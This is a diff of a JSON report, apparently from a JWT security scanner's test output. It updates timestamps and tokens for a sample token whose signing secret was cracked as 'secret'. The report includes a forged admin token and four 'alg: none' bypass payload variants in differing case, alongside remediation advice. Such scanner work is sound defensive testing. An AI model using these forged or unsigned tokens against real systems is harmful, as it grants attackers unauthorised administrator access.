@@ -1,5 +1,5 @@
 {
-  "rawToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJzdGFuZGFyZF91c2VyIiwiZW1haWwiOiJqb2huQGNvcnAuaW50ZXJuYWwiLCJzc24iOiIxMjMtNDUtNjc4OSIsImlhdCI6MTc5MzI2NTU2OX0.yyp-BVEnhcYoUr8gUL5NcqNB5V8k9b72HIM3VfqWIJQ",
+  "rawToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJzdGFuZGFyZF91c2VyIiwiZW1haWwiOiJqb2huQGNvcnAuaW50ZXJuYWwiLCJzc24iOiIxMjMtNDUtNjc4OSIsImlhdCI6MTc5MzI2NjUyMn0.IxjzcT_dVbhMmTeni1gcsDNTNHrQ9LFfrZk-AOwxXIU",
   "header": {
     "alg": "HS256",
     "typ": "JWT"
@@ -10,7 +10,7 @@
     "role": "standard_user",
     "email": "john@corp.internal",
     "ssn": "123-45-6789",
-    "iat": 1793265569
+    "iat": 1793266522
   },
   "hasSignature": true,
   "score": 25,
@@ -24,7 +24,7 @@
       "cvss": 9.1,
       "description": "The symmetric signing secret was cracked in 1 attempts using a standard wordlist: 'secret'. Anyone can forge valid tokens.",
       "remediation": "Rotate the JWT secret immediately. Use a cryptographically secure random string with at least 256 bits of entropy (e.g. `openssl rand -hex 32`).",
-      "exploitPoC": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjU1NjksImlzX2FkbWluIjp0cnVlfQ.G5ASexvA0nYSr2W7oLuZipfIT4QmBJOTBUZ9dw46s1A"
+      "exploitPoC": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjY1MjIsImlzX2FkbWluIjp0cnVlfQ.x-v9Cfc1yVzEELqJuOlhPgSjBYQRkIu6S3heIJOWuMU"
     },
     {
       "id": "SEC-JWT-003",
@@ -46,32 +46,32 @@
     }
   ],
   "exploitPayloads": {
-    "originalToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJzdGFuZGFyZF91c2VyIiwiZW1haWwiOiJqb2huQGNvcnAuaW50ZXJuYWwiLCJzc24iOiIxMjMtNDUtNjc4OSIsImlhdCI6MTc5MzI2NTU2OX0.yyp-BVEnhcYoUr8gUL5NcqNB5V8k9b72HIM3VfqWIJQ",
+    "originalToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJzdGFuZGFyZF91c2VyIiwiZW1haWwiOiJqb2huQGNvcnAuaW50ZXJuYWwiLCJzc24iOiIxMjMtNDUtNjc4OSIsImlhdCI6MTc5MzI2NjUyMn0.IxjzcT_dVbhMmTeni1gcsDNTNHrQ9LFfrZk-AOwxXIU",
     "forgedPayload": {
       "sub": "user_49102",
       "username": "john_doe",
       "role": "admin",
       "email": "john@corp.internal",
       "ssn": "123-45-6789",
-      "iat": 1793265569,
+      "iat": 1793266522,
       "admin": true
     },
     "payloads": [
       {
         "variant": "none",
-        "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjU1NjksImFkbWluIjp0cnVlfQ."
+        "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjY1MjIsImFkbWluIjp0cnVlfQ."
       },
       {
         "variant": "None",
-        "token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjU1NjksImFkbWluIjp0cnVlfQ."
+        "token": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjY1MjIsImFkbWluIjp0cnVlfQ."
       },
       {
         "variant": "NONE",
-        "token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjU1NjksImFkbWluIjp0cnVlfQ."
+        "token": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjY1MjIsImFkbWluIjp0cnVlfQ."
       },
       {
         "variant": "nOnE",
-        "token": "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjU1NjksImFkbWluIjp0cnVlfQ."
+        "token": "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQ5MTAyIiwidXNlcm5hbWUiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiam9obkBjb3JwLmludGVybmFsIiwic3NuIjoiMTIzLTQ1LTY3ODkiLCJpYXQiOjE3OTMyNjY1MjIsImFkbWluIjp0cnVlfQ."
       }
     ]
   }
